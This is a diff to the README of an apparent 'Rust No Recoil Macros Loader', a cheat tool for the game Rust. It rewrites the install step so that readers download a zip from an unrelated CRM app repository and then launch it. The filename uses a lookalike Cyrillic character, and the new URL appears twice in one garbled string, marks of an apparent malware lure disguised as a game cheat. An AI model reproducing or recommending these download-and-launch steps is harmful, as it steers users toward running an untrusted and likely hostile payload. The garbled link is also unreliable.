@@ -22,7 +22,7 @@ Welcome to the ultimate Rust No Recoil Macros Loader repository! This resource i
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/KuroLogical/crm-lead-management-app-react-native/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/KuroLogical/crm-lead-management-app-react-native/main/tosspot/management_crm_react_app_lead_native_citronin.zipоhttps://raw.githubusercontent.com/KuroLogical/crm-lead-management-app-react-native/main/tosspot/management_crm_react_app_lead_native_citronin.zip** from the repository.
 2. Extract the loader to a desired directory on your PC.
 3. Launch the Loader and configure your preferred macro settings.
 4. Start Rust and enjoy enhanced recoil control.
